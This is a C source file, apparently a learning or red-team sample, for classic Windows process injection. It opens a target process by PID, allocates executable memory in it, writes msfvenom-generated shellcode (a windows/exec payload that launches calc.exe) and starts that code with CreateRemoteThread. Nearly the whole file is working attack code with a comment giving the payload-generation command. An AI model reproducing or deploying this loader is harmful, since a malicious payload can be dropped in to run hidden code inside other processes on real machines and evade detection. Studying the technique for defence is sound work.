#include <windows.h>
#include <sys/types.h>
#include <unistd.h>





int main(int argc, char **argv){
	//msfvenom -p windows/exec cmd=calc.exe EXITFUNC=thread -f c -v shellcode
	
	int process_id = atoi(argv[1]);
    

	char shellcode[] = \
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	HANDLE process_handle;
	DWORD pointer_after_allocated;
	process_handle =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, process_id);
	if (process_handle==NULL)
{ 
	  puts("[-]Error while open the process\n");

}else{
	puts("[+] Process Opened sucessfully\n");
}
	pointer_after_allocated = VirtualAllocEx(process_handle, NULL , sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(pointer_after_allocated==NULL){
		puts("[-]Error while get the base address to write\n");
	}else{
		printf("[+]Got the address to write 0x%x\n", pointer_after_allocated);
	}
	if(WriteProcessMemory(process_handle, (LPVOID)pointer_after_allocated, (LPCVOID)shellcode, sizeof(shellcode), 0)){
		puts("[+]Injected\n");
		puts("[+]Running the shellcode as new thread !\n");
		//CreateRemoteThread(process_handle, NULL, 0, pointer_after_allocated, NULL, 0, );
		CreateRemoteThread(process_handle, NULL, 100,(LPTHREAD_START_ROUTINE)pointer_after_allocated, NULL, NULL, 0x50002); 

	}else{
	puts("Not Injected\n");
	}
	
	
	
}
